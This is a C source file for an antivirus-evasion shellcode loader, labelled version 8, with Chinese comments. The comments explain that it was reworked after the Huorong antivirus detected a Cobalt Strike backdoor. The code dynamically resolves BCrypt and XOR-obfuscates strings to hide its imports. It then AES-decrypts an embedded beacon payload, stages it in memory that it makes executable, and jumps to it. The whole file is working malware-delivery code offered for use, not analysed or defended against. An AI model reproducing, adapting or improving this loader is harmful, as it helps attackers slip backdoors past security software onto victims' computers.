#include <windows.h>

// ============================================================
//  AV Evasion Loader v8 — AES-256-CBC + BCrypt 动态解析
//
//  v6 -> v8 变更 (针对火绒检出 Backdoor/CobaltStrike.ag):
//  旧方案 XOR 0x5A + IPv4 混淆被火绒引擎直接解密识别 (透明壳)。
//  v8 改为密码学强度加密: 载荷用 AES-256-CBC 加密, 运行时通过
//  Windows 原生 BCrypt API (bcrypt.dll, 动态 GetProcAddress 解析)
//  解密。密文高熵随机, AV 无法解密识别载荷。
//
//  保留: 字符串加密 / VirtualAlloc RW->RX 加载 / 内嵌密文
// ============================================================

typedef LONG NTSTATUS;
#define STATUS_SUCCESS ((NTSTATUS)0x00000000)

// ---- BCrypt 函数类型 (动态解析, 不进 IAT) ----
typedef NTSTATUS (NTAPI *pBCryptOpenAlgorithmProvider)(
    void **phAlgorithm, LPCWSTR pszAlgId, LPCWSTR pszImplementation, ULONG dwFlags);
typedef NTSTATUS (NTAPI *pBCryptSetProperty)(
    void *hObject, LPCWSTR pszProperty, const UCHAR *pbInput,
    ULONG cbInput, ULONG dwFlags);
typedef NTSTATUS (NTAPI *pBCryptGenerateSymmetricKey)(
    void *hAlgorithm, void **phKey, UCHAR *pbKeyObject,
    ULONG cbKeyObject, const UCHAR *pbSecret, ULONG cbSecret, ULONG dwFlags);
typedef NTSTATUS (NTAPI *pBCryptDecrypt)(
    void *hKey, UCHAR *pbInput, ULONG cbInput, void *pPaddingInfo,
    UCHAR *pbIV, ULONG cbIV, UCHAR *pbOutput, ULONG cbOutput, ULONG *pcbResult, ULONG dwFlags);
typedef NTSTATUS (NTAPI *pBCryptDestroyKey)(void *hKey);
typedef NTSTATUS (NTAPI *pBCryptCloseAlgorithmProvider)(void *hAlgorithm, ULONG dwFlags);

// ============================================================
//  字符串加密 (0x5A)
// ============================================================
#define XOR_KEY 0x5A

static inline void DecryptStr(const BYTE* enc, char* dec, SIZE_T maxLen) {
    volatile SIZE_T i;
    for (i = 0; i < maxLen - 1 && enc[i] != 0; i++) {
        dec[i] = (char)(enc[i] ^ XOR_KEY);
    }
    dec[i] = '\0';
}

static const BYTE enc_bcrypt[] = { 'b'^0x5A, 'c'^0x5A, 'r'^0x5A, 'y'^0x5A, 'p'^0x5A, 't'^0x5A, '.'^0x5A, 'd'^0x5A, 'l'^0x5A, 'l'^0x5A, 0^0x5A };

// ---- AES 相关常量 (宽字符串, 直接内嵌; 非敏感) ----
static const wchar_t AES_ALG[]  = L"AES";
static const wchar_t CHAIN_CBC[] = L"ChainingModeCBC";
static const wchar_t PROP_CHAIN[] = L"ChainingMode";

// ============================================================
//  内嵌 AES 密文载荷 (由 encrypt_aes.py 生成)
// ============================================================
#include "payload_v8.h"

// ============================================================
//  主函数
// ============================================================
int main() {
    // ---- Step 1: 动态解析 BCrypt ----
    char bcryptName[16];
    DecryptStr(enc_bcrypt, bcryptName, sizeof(bcryptName));

    HMODULE hBcrypt = LoadLibraryA(bcryptName);
    SecureZeroMemory(bcryptName, sizeof(bcryptName));
    if (!hBcrypt) return 0;

    pBCryptOpenAlgorithmProvider fnOpen = (pBCryptOpenAlgorithmProvider)GetProcAddress(hBcrypt, "BCryptOpenAlgorithmProvider");
    pBCryptSetProperty fnSetProp = (pBCryptSetProperty)GetProcAddress(hBcrypt, "BCryptSetProperty");
    pBCryptGenerateSymmetricKey fnGenKey = (pBCryptGenerateSymmetricKey)GetProcAddress(hBcrypt, "BCryptGenerateSymmetricKey");
    pBCryptDecrypt fnDecrypt = (pBCryptDecrypt)GetProcAddress(hBcrypt, "BCryptDecrypt");
    pBCryptDestroyKey fnDestroyKey = (pBCryptDestroyKey)GetProcAddress(hBcrypt, "BCryptDestroyKey");
    pBCryptCloseAlgorithmProvider fnClose = (pBCryptCloseAlgorithmProvider)GetProcAddress(hBcrypt, "BCryptCloseAlgorithmProvider");

    if (!fnOpen || !fnSetProp || !fnGenKey || !fnDecrypt || !fnDestroyKey || !fnClose) {
        return 0;
    }

    // ---- Step 2: AES-256-CBC 解密 ----
    SIZE_T ptSize = ENC_BEACON_LEN;
    unsigned char* plain = (unsigned char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ptSize);
    if (!plain) return 0;

    void *hAlg = NULL, *hKey = NULL;
    NTSTATUS st = STATUS_SUCCESS;

    st = fnOpen(&hAlg, AES_ALG, NULL, 0);
    if (st != STATUS_SUCCESS) goto fail;

    st = fnSetProp(hAlg, PROP_CHAIN, (const UCHAR*)CHAIN_CBC, sizeof(CHAIN_CBC), 0);
    if (st != STATUS_SUCCESS) goto fail;

    st = fnGenKey(hAlg, &hKey, NULL, 0, (UCHAR*)aes_key, 32, 0);
    if (st != STATUS_SUCCESS) goto fail;

    // 复制 IV (BCryptDecrypt 会修改 IV 缓冲)
    UCHAR iv[16];
    memcpy(iv, aes_iv, 16);

    ULONG done = 0;
    st = fnDecrypt(hKey, (UCHAR*)enc_beacon, (ULONG)ENC_BEACON_LEN, NULL,
                   iv, 16, plain, (ULONG)ptSize, &done, 0);
    if (st != STATUS_SUCCESS || done == 0) goto fail;

    if (hKey) fnDestroyKey(hKey);
    if (hAlg) fnClose(hAlg, 0);
    FreeLibrary(hBcrypt);

    // 去掉 PKCS7 填充 (最后 1 字节 = 填充长度)
    SIZE_T payloadLen = done;
    if (payloadLen > 0) {
        BYTE pad = plain[payloadLen - 1];
        if (pad > 0 && pad <= 16 && payloadLen >= pad) {
            payloadLen -= pad;
        }
    }

    // ---- Step 3: 分配执行内存 + 写入 ----
    unsigned char* execBuf = (unsigned char*)VirtualAlloc(
        NULL, payloadLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!execBuf) {
        SecureZeroMemory(plain, ptSize);
        HeapFree(GetProcessHeap(), 0, plain);
        return 0;
    }

    memcpy(execBuf, plain, payloadLen);

    // 擦除明文
    SecureZeroMemory(plain, ptSize);
    HeapFree(GetProcessHeap(), 0, plain);

    DWORD oldProt = 0;
    if (!VirtualProtect(execBuf, payloadLen, PAGE_EXECUTE_READ, &oldProt)) {
        VirtualFree(execBuf, 0, MEM_RELEASE);
        return 0;
    }

    FlushInstructionCache(GetCurrentProcess(), execBuf, payloadLen);

    // ---- Step 4: 执行 ----
    typedef void (*ShellcodeEntry)();
    ShellcodeEntry entry = (ShellcodeEntry)execBuf;
    entry();

    VirtualFree(execBuf, 0, MEM_RELEASE);
    return 0;

fail:
    if (hKey) fnDestroyKey(hKey);
    if (hAlg) fnClose(hAlg, 0);
    FreeLibrary(hBcrypt);
    SecureZeroMemory(plain, ptSize);
    HeapFree(GetProcessHeap(), 0, plain);
    return 0;
}
